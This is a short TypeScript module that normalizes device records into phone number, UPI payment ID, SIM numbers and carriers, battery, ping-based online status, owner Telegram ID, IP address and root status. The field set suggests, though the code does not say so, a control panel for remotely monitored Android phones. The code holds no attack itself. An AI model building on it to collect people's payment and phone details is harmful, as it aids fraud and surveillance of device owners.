export interface NormalizedDevice {
  id: string;
  model: string;
  phone: string;
  upi: string;
  battery: string;
  sim1: string;
  sim2: string;
  isOnline: boolean;
  ownerTelegramId?: string;
  androidV?: string;
  sdkV?: string;
  ip_address?: string;
  storage?: string;
  cpu_arch?: string;
  isRoot?: boolean;
  isSdCard?: boolean;
  joined?: string;
  raw: Record<string, any>;
}

export function normalizeDevice(id: string, raw: Record<string, any>): NormalizedDevice {
  const model = raw.modelName ?? raw.model ?? 'Unknown';
  const phone = raw.mobNo ?? raw.phone ?? '';

  let sim1 = raw.sim1 ?? '';
  let sim2 = raw.sim2 ?? '';
  if (Array.isArray(raw.sims)) {
    if (raw.sims[0]) {
      const s = raw.sims[0];
      sim1 = [s.phoneNumber, s.carrierName].filter(Boolean).join(' · ');
    }
    if (raw.sims[1]) {
      const s = raw.sims[1];
      sim2 = [s.phoneNumber, s.carrierName].filter(Boolean).join(' · ');
    }
  }

  let isOnline = false;
  if (raw.ping) {
    const t = parseInt(raw.ping, 10);
    if (!isNaN(t)) isOnline = Date.now() - t < 300_000;
  } else if (typeof raw.status === 'boolean') {
    isOnline = raw.status;
  } else if (typeof raw.status === 'string') {
    isOnline = raw.status === 'true' || raw.status === 'online';
  }

  return {
    id,
    model,
    phone,
    upi: raw.upi ?? '',
    battery: raw.battery ?? '',
    sim1,
    sim2,
    isOnline,
    ownerTelegramId: raw.ownerTelegramId,
    androidV: raw.androidV,
    sdkV: raw.sdkV,
    ip_address: raw.ip_address,
    storage: raw.storage,
    cpu_arch: raw.cpu_arch,
    isRoot: raw.isRoot,
    isSdCard: raw.isSdCard,
    joined: raw.joined,
    raw,
  };
}

export function getBatteryNum(battery: string): number {
  return parseInt(battery?.replace('%', '') ?? '0', 10) || 0;
}
